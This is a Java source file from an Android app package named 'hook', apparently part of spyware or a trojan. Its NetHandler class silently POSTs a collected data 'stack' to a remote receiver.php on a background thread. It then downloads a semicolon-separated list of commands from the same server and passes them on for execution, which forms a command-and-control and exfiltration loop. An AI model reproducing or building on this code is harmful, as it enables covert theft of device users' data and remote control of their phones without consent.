package mg.broadcast.hook.handler;

import android.net.NetworkInfo;
import android.net.ConnectivityManager;
import android.content.Context;

import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.ResponseHandler;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.impl.client.BasicResponseHandler;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.util.Date;
import java.util.List;
import java.util.ArrayList;
import java.text.SimpleDateFormat;

import mg.broadcast.hook.hidden.Constants;

public class NetHandler extends Handler{
	
	final String POST_KEY_FILE="hook_file";
	final String POST_KEY_DATA="hook_data";
	
	final String URL_SERVER=Constants.NET_SERVER;
	
	final String URL_GET=URL_SERVER+"commands.txt";
	final String URL_POST=URL_SERVER+"receiver.php";
	
	public NetHandler(Context context){
		super(context);
	}
	
	public boolean isOnline(){
		ConnectivityManager cm=(ConnectivityManager)context.getSystemService(Context.CONNECTIVITY_SERVICE);
		NetworkInfo netInfo=cm.getActiveNetworkInfo();
		return (netInfo!=null && netInfo.isConnected());
	}
	
	public void postStack(){
		new Thread(new Runnable(){
			@Override
			public void run(){
				if(!isDone()){
					POST(readStack());
					EXECUTE();
					finish();
				}
			}
		}).start();
	}
	
	private void POST(String data){
		HttpClient httpClient=new DefaultHttpClient();
		HttpPost httpPost=new HttpPost(URL_POST);

		String file=new SimpleDateFormat("ddMMyyHHmmss").format(new Date()).concat(".stack");
		
		try{
			List<BasicNameValuePair> pairValue=new ArrayList<>();
			pairValue.add(new BasicNameValuePair(POST_KEY_FILE,file));
			pairValue.add(new BasicNameValuePair(POST_KEY_DATA,data));
			
			httpPost.setEntity(new UrlEncodedFormEntity(pairValue));

			HttpResponse response=httpClient.execute(httpPost);
			//String op = EntityUtils.toString(response.getEntity(), "UTF-8");
			
		}
		catch(UnsupportedEncodingException|IOException e){
		}
		
	}
	
	public void EXECUTE(){
		handle(getCommands());
	}
	
	public String[] getCommands(){
		ArrayList<String> commands=new ArrayList<>();
		return GET(commands).get(0).split(";");
	}
	
	private List<String> GET(List<String> responses){
		HttpClient httpClient=new DefaultHttpClient();
		HttpGet httpGet=new HttpGet(URL_GET);

		try{
			ResponseHandler<String> responseHandler=new BasicResponseHandler();
			responses.add(httpClient.execute(httpGet,responseHandler));
		}
		catch(IOException e){
			responses.add("ERROR GET");
		}
		return responses;
	}
	
}
